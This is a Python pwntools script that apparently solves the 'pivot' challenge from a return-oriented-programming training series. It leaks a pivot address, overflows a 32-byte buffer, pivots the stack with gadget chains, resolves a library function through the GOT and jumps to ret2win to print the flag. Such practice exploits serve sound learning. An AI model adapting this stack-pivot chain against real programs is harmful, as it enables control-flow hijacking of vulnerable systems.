from pwn import *

elf = ELF("pivot")
libpivot = ELF('libpivot.so')
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb6
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32

def main():
    pop_rax_gadget = elf.symbols.usefulGadgets # pop rax; ret
    xchg_rax_rsp_gadget = elf.symbols.usefulGadgets + 2 # xchg rax, rsp; ret
    mov_rax_ptr_rax_gadget = elf.symbols.usefulGadgets + 5 # mov rax, [rax]; ret
    add_rax_rbp_gadget = elf.symbols.usefulGadgets + 7 # add rax, rbp; ret

    jmp_rax_gadget = next(elf.search(asm('jmp rax')))

    c = connection()
    pivot_address = int(c.recvregex(rb'pivot: (.+)\n', capture=True).group(1), 16)

    smash_payload = flat \
    ({
        BUFFER_SIZE: \
        [
            # use rbp as a storage to calculate ret2win starting from foothold_function
            libpivot.symbols.ret2win - libpivot.symbols.foothold_function,

            # fake the stack on the given page
            pop_rax_gadget, pivot_address,
            xchg_rax_rsp_gadget,
        ]
    })
    assert len(smash_payload) <= 0x40

    pivot_payload = flat \
    ([
        # resolve foothold_function
        elf.plt.foothold_function,

        # load foothold_function symbol
        pop_rax_gadget, elf.got.foothold_function,
        mov_rax_ptr_rax_gadget,

        # reach ret2win
        add_rax_rbp_gadget,
        jmp_rax_gadget
    ])
    assert len(pivot_payload) <= 0x100

    c.sendafter(b'> ', pivot_payload)
    c.sendafter(b'> ', smash_payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
